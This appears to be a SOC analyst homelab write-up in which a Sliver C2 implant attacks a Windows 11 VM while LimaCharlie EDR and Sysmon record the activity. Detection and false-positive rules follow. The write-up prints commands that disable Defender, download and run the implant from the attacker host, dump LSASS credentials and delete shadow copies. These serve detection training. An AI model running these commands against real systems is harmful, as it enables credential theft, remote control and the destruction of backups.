This is a report based on a homelab created using LimaCharlie EDR with Sysmon and VMWare for lab containers.

**<h2>Initial Setup:</h2>**

This lab involves the use of two virtual machines: one serving as an attack machine while the other is used as a victim machine for simulating an actual attack and capturing traffic in the process. Here, we are using a Windows 11 VM as the victim machine while an Ubuntu Server 22.04.1 VM is used as the attacker VM, with the hypervisor being VMWare Workstation Pro.

<img width="1470" alt="Pasted Graphic" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/092551ea-76a7-4b62-bacb-8e00433bfb0e">

**<h3>Step 1: Setting up the VMs</h3>** 

**<h4>1A. Ubuntu Server VM:</h4>**

In the first step, we set up the Ubuntu Server VM such that it has a static IP address and can be easily accessed from the host system. In VMWare Workstation Pro, going to Edit-> Virtual Network Editor, we can figure out the Subnet and Gateway IP of the Ubuntu VM. 

![External Connection](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/4cab390a-0b90-452f-99d3-54e7d2eab787)

![NAT Settings](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/ffafc601-ce07-43c0-86d8-fdcb130485e9)

We then enter this information into the Subnet and Gateway fields into the VM’s data fields, with a hostname of 8.8.8.8 to ensure that this VM has a static IP address. We also install OpenSSH so that the host client can connect to the VM remotely, making copy/paste operations easier. 

![f6d1e3b7-9dfc-4d70-b40b-76d700f5496b_926x264](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/5763041b-78fc-4d91-a1e8-8d775d4bcb7e)

Pinging 8.8.8.8 with the Ubuntu VM, we can see that it has been successfully configured to work with external networks. 

<img width="423" alt="user@attackoptsliver$ ping -c 2 8 8 8 8" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/48c27d7a-00b1-4419-aea4-6cc32a1b5519">

This indicates that the VM is now ready to perform the required operations.

**<h4>1B. Windows VM:</h4>** 

We will be using a Windows 11 VM with all the defenses turned off so that Microsoft Defender does not interfere in the operations we will be performing. 

**<h5>A. Disabling Tamper Protection:</h5>** 
   Tamper protection helps protect certain security settings, such as virus and threat protection, from being disabled or changed. We turn this off along with the other settings in the Virus and Threat Protection settings in Windows Defender. 

   ![image](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/15b61bbc-3734-4320-8ea2-ae7f2e1688a2)


   **<h5>B. Local Group Policy Editor:</h5>** 
    The Local Group Policy Editor (or gpedit. msc) is a system utility that allows you to view and edit group policy settings on your computer. This tool can be further used to configure advanced system settings that aren't available in the standard Settings app or Control Panel. Going to Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus, we can enable “Turn Off Microsoft Defender Antivirus”, which prevents Defender from running and checking for any malware or PUP (Potentially Unwanted Programs).


<img width="1143" alt="Pasted Graphic 2" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/da2a759e-bf5d-45da-bb14-324149dbb7f7">


  C. Additionally, we also run the command “REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f”, which adds a value to the Windows Registry in Local Machine that sets the value of Anti-Spyware to 1, disabling Defender’s anti-spyware component. This is essential for us, as we prefer to use a different security solution and wants to ensure that Windows Defender does not interfere. 
 
**<h3>Step 2:  Setup Defense Systems for Logging and Collection</h3>**

**<h4>2A. Installing Sysmon:</h4>**
	System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. Using the following set of commands, we can correctly install and then configure Sysmon on the Windows VM. 


```
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
The aforementioned commands are responsible for downloading and installing Sysmon on the Windows VM. We also include an additional configuration script for it, which functions as a starting point for system change monitoring in a self-contained and accessible package. This configuration and results also give us an idea of what is possible for Sysmon.

We then run the following two commands, which check if the Sysmon service is up and running while checking for any logged events to see if the service is working as intended.

```
Get-Service sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

![PS C UsersUserDownloadsSysmon Get-Service sysmon64](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/e3ca8836-d3c7-4df0-879d-aa9f9294cea7)
<img width="639" alt="Pasted Graphic 3" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/fc2ed2ed-5370-49fd-883d-14bdc84fd0e9">

**<h4>2B. Creating a LimaCharlie sensor:</h4>**

Limacharlie is an Endpoint Detection and Response (EDR) solution, offering continuous and unparalleled visibility into desktop, server, and cloud endpoints. It excels in monitoring both behavioral and technical aspects, with a telemetry retention period of 1 year. In this lab, we will use LimaCharlie as our primary source of collection for the Sysmon logs and analysis of said logs. 

After creating a LimaCharlie account, we then move on to the process of creating a sensor for having a centralized platform for collection and analysis of data. The first step is to create a sensor on the platform for Windows 11.

<img width="879" alt=" Select the installer for your architecture" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/fe2ecf58-8d58-4a8c-93fd-4f62aae5ddd2">

We then use the download link with the command line argument to install the sensor into an executable file into our local directory.

![f821e410-d4d3-4161-a426-9d8ff348806c_610x392](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/db997877-4423-4137-a9cd-25e013a8be36)

This screen marks the successful installation of the sensor, which can then be viewed in the actual LimaCharlie cloud platform, where we can see that the sensor is active and running while receiving logs from the system on which it is installed on.

<img width="981" alt="Pasted Graphic 5" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/f763c27e-d646-4180-aaa6-2762494840dc">

**<h4>2C. Setting up the Attack VM using Sliver:</h4>**

Sliver is a command and control (C2) framework designed to provide advanced capabilities for covertly managing and controlling remote systems. This tool can be used to set up a secure and reliable communication channel over Mutual TLS, HTTP(S), DNS, or Wireguard with target machines, enabling them to execute commands, gather information, and perform various post-exploitation activities.

This can be done locally or through SSH, using the OpenSSH server we installed earlier, connecting to the Ubuntu VM using the command ssh user@192.168.78.128.


```
sudo apt install -y mingw-w64
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
sudo chmod +x /usr/local/bin/sliver-server
mkdir -p /opt/sliver
```

The commands written above can be executed in order to first install Mingw64 for dependencies, then we use wget to download and install the sliver-server binary, which allows us to run a server on this VM. Finally, we create a working local directory for the server. 


**<h3>Step 3: Generating Attack Payload and Observing EDR Telemetry</h3>**

**<h4>3A: Generating Payload:</h4>**

Now, moving on to our local directory of /opt/sliver, we then proceed to launch an attack using the Sliver server we installed earlier. This server can be started by using the **sliver-server** command. We then generate a C2 attack payload using the command generate --http 192.168.78.128 --save /opt/sliver, which creates an executable file and stores it in the local directory. The generation can be checked by using the **implants** command.

![image](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/eb104876-d0ae-40b3-bb8d-1a06effc2649)

<img width="727" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/e21335c8-a581-4e4b-8266-df0d6bee6c36">

However, the malicious executable has to be present on the Windows VM for the Sysmon sensor to pick up traffic. So we set up a temporary Python server using HTTP at port 80, then proceed to download the executable onto the Windows VM. This method is far easier and safe than utilizing the host client to transfer files between the VMs.

```python3 -m http.server 80```
```IWR -Uri http://192.168.78.128/SPANISH_EXHAUST.exe -Outfile C:\Users\User\Downloads\[payload_name].exe```

After this, we need to execute the binary and see if it up and running smoothly. Firstly, we run the **http** command to set up a listener looking for any events from the Windows VM. We then execute the binary present on the VM with administrative privileges and check on the Ubuntu VM with the **sessions** command to show a list of the active binaries present in the payload. Using the session ID, we can log into the binary's command line interface, effectively allowing us to control the Windows VM from our attacker machine. 

<img width="1180" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/7cc2bff0-8acd-480a-980d-abb9c02adefc">

We then run a series of commands to check for identity, basic information and privileges of the machine the binary is present on.

<img width="446" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/a72088dc-a13f-402d-98e4-e315a588f81e">

<img width="755" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/751b0837-64b0-42b5-a20c-a64890d479a2">

Since the binary is running with admin privileges, we have access to almost everything on the system, which qualifies as dangerous traffic. 

**<h4>3B: Observing EDR Telemetry</h4>**

We then proceed to observe the traffic between these two VMs using the LimaCharlie platform. This can be done by checking through 3 different ways of showing data:

**<h5>Processes:</h5>** Processes are meticulously monitored through endpoint agents that collect comprehensive data on process creation, termination, and behavior, including process names, IDs, command lines, and execution paths, that can be analyzed for suspicious activity. Here, we can see that the SPANISH_EXHAUST.exe binary is executing with a PID of 556, and most importantly it is an unsigned action, which is possible proof of it being malicious.

![image](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/2f8b77c0-ca69-4797-94f4-7271524ef7b8)

**<h5>Network Connections:</h5>** 

Opening the Network tab, we can see that the malicious binary is currently running on 192.168.78.129, which is the Windows VM's IP address on port 80 (HTTP), and that the 3-way handshake has been finished and the connection has been made, which is shown through the ESTABLISHED state.

<img width="1190" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/9ebfe3a1-9fd3-4136-b4bb-14b6a87e2a91">

**<h5>File System:</h5>** 

LimaCharlie also offers a complete overview of the system the sensor is running on. We utilize this function to move to where our binary is located, and examine the file's hash using VirusTotal. This helps us identify that since VirusTotal has never seen the hash before, it logs it as an unknown file, which could be malicious in nature.

<img width="889" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/24000473-4895-42c9-a557-e6c95f6c5ec9">

**<h3>Step 4: Deploying Countermeasures for Incident Detection and Response</h3>**

**<h4>4A. Performing Lsass.exe and Vssadmin Shadow Attacks</h4>**

The Local Security Authority Subsystem Service (LSASS) is a process that handles user authentication, security policies, and auditing on Windows systems. It's executable, lsass.exe is a common way of gaining access to user credentials, especially the domain admin's. This has been observed previously in attacker groups such as HAFNIUM and GALLIUM, and it can be said that dumping the lsass process from memory could possible be a breach of sensitive data.

Using the Sliver framework's malicious executable located on our victim machine, we can spawn a remote shell and have it dump the lsass process by running the command 

```
procdump -n lsass.exe -s lsass.dmp
```
This can then be observed in the Limacharlie Timeline under the **SENSITIVE_PROCESS_ACCESS** category. 


![Pasted Graphic 3](https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/0af4a954-17c1-4520-a237-612945ded7b6)


<img width="1224" alt="Pasted Graphic" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/26c5887a-caa5-4bed-9a90-c5356b63ce98">

Using the same shell, we can then proceed to attack the vssadmin command line tool using the Volume Shadow Copy Service, which is responsible for displaying the current volume shadow copy backups and all installed shadow copy writers and providers. Many malicious entities, particularly ransomware gangs employ this technique as one of the common ways of deleting backups present in the system after gaining administrative privileges. 

In the shell, we then proceed to run the following command:

```
vssadmin delete shadows /all
```

The delete shadows command removes all backup copies of computer files and volumes from the system completely. This is an irreversible command, and it can be seen by default under LimaCharlie's Detections and Timeline events as malicious traffic.

<img width="1470" alt="Pasted Graphic 4" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/f75d45c2-c5ee-4ae3-a8b0-26ceb466615f">


<img width="1226" alt="Pasted Graphic 5" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/d0cc4468-5337-4b11-816f-e8fd581ffd5a">


**<h4>4B. Crafting and Testing Detection and Response Rules</h4>**

To prevent this, we need to craft a Detection and Response (D&R) Rule. To do this, we head to Automation -> D&R Rules and then proceed to enter the following data. This rule works by first checking whether the event is in the **SENSITIVE_PROCESS_ACCESS** category, and then it proceeds to look for commands with a file path of where the event has happened and if they involve the lsass.exe file.

<img width="738" alt="op and" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/0752ecf0-79c4-4f6e-b58d-2600eab2d963">

We can then test this rule by going further down and clicking on the **Test Event** button. This shows us that the rule has successfully managed to detect malicious traffic that is similar in terms of telemtry to this type of intrustion.

<img width="707" alt="Pasted Graphic 2" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/24f814b9-6e6c-4a88-a201-5a8ae9d0548f">

Following on, we then proceed to make a similar rule for the vssadmin event, but with a response rule this time. This rule utilizes the COMMAND_LINE parameter of LimaCharlie's detection rules to check for whether the words 'delete', 'shadow' and 'all' are present within one command line instruction.

<img width="277" alt="path eventCOMMAND_LINE" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/b95308a9-1cf9-4b34-a8f8-9a956bf12bd9">

The response section involves using action: task, which tells the system to perform the commands deny_tree, which tells the sensor that all activity starting at a specific process (and its children) should be denied and killed. 

```
- action: report
  name: vss_deletion_kill_it
- action: task
  command:
    - deny_tree
    - <<routing/parent>>
```
We then test out our newly crafted D&R rule by trying to run the delete shadows command again.

<img width="616" alt="Pasted Graphic 6" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/fb9b7e04-cce5-4a30-80c6-46522354c4f6">

However, this time the command fails due to the response rule that we crafted earlier - deny_tree which kills the process responsible for executing the vssadmin commands, keeping the shadow copies safe.


**<h3>Step 5: Tuning Detection Rules for False Positives: </h3>**

False positives are used to refer to alerts that may suggest a potential threat but are eventually proven to be harmless. In most cases, it turns out that a lot of traffic is legitimate and has simply been flagged due to improper customization of the detection rules. To solve this, we first take a look at what traffic is being detected by the sensors. 

<img width="1214" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/9d846729-b2ba-4848-88a3-eb207e8df574">

We can see that there is an enormous amount of traffic originating from the usage of the Svchost process, which is a system process that can host one or more Windows services in the Windows NT family of operating systems. This eats up a lot of space and makes it more difficult to sift out malicious activity from legitimate network traffic. This can be resolved by crafting some False Positive rules for the sensor. 

Going to Automation -> False Positive Rules in LimaCharlie, we can use the following rule to make sure the legitimate traffic of the svchost traffic is not being detected under our Events tab. This rule checks for two things: 
	1. Whether the -k flag is present in the command, which is used to specify the service group in which the service is running.
 	2. If the command is being run from System32, which is a privileged directory, and is usually run by services such as svchost.

<img width="724" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/ce0cc240-4645-4b43-ad11-37e76a60e883">


We then to go the **Target Detection** tab to check whether our rule is correctly detecting the false positive traffic by taking one of the detected events as our test data.


<img width="520" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/3379e1dd-a96a-45da-ad9a-97baeadc7937">

<img width="728" alt="image" src="https://github.com/Fogstone/SOC-Analyst-Homelab/assets/51188893/cffc7c1f-1a6a-436a-a390-f98efda61d10">

We can then see that the traffic has been successfully detected as a false positive by the rule we've just crafted, reducing the amount of data a human has to sift through in the future. The ideal usage scenario would be to let this rule run over the course of a few days or a week, see how it reacts to day-to-day traffic and then make changes accordingly. 



